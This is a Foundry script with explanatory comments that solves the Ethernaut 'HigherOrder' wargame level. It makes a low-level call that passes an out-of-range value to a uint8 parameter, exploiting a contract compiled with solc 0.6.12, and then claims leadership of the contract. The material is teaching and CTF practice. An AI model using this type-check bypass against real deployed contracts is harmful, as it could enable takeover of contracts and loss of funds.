// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/HigherOrder.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv

contract HigherOrderSolution is Script {
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = vm.envAddress("HIGHERORDER_INSTANCE");
    /*
        We need to register the treasury value to be greater than 255
        https://www.evm.codes/#35 CALLDATALOAD
        https://www.evm.codes/#55 SSTORE
        notice that the contract uses assembly to start reading from the 4th byte of the calldata using calldataload(4) (All bytes after the end of the calldata are set to 0.)
        It starts at the 4th byte to skip to the function selector and start reading the value passed to the function
        Then it uses sstore to store the value in the treasury slot (it stores 32 bytes)

        So basically we can pass for example ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff as the value to registerTreasury
        But pay attention that the function receives uint8 which it is represented as 1 byte, which its maximun is 255
        
        We can bypass typecheck by using low level call
        This is because in solidity 0.6 there is not typecheck for low level calls

        More info: https://ardislu.dev/ethernaut/30
        Despite this level being released in 2024 (the current solc version is 0.8.26), this level uses the 4 year old version 0.6.12 of solc. It's also referenced in the level hint:
        Compilers are constantly evolving into better spaceships.
        The reason for this is that starting in solc version 0.8.0, ABI coder v2 was enabled by default. This change added new safeguards so that the input type actually is checked, regardless of inline assembly usage:
        ABI coder v2 makes some function calls more expensive and it can also make contract calls revert that did not revert with ABI coder v1 when they contain data that does not conform to the parameter types.
        So, the above transaction would in fact be rejected if the smart contract were compiled with a solc version >0.8.0.
        Nonetheless, it's still critical to understand that the EVM itself does not enforce these safeguards.
        Even though the modern solc compiler will integrate safeguards now, you still need to understand what's being done by solc vs. the EVM when you go low-level.
    */

    function run() external {
        vm.startBroadcast(deployerPrivateKey);

        // register the treasury value to be greater than 255 using low level call
        (bool success, ) = instance.call(abi.encodeWithSignature("registerTreasury(uint8)", 256));
        (bool success2, bytes memory returndata) = instance.call(abi.encodeWithSignature("treasury()"));
        uint256 treasury = abi.decode(returndata, (uint256));
        console.log("Treasury :", treasury);

        // claim leadership
        (bool success3, ) = instance.call(abi.encodeWithSignature("claimLeadership()"));
        (bool success4, bytes memory commanderAddress) = instance.call(abi.encodeWithSignature("commander()"));
        address commander = abi.decode(commanderAddress, (address));
        console.log("Commander :", commander);

        vm.stopBroadcast();
    }

}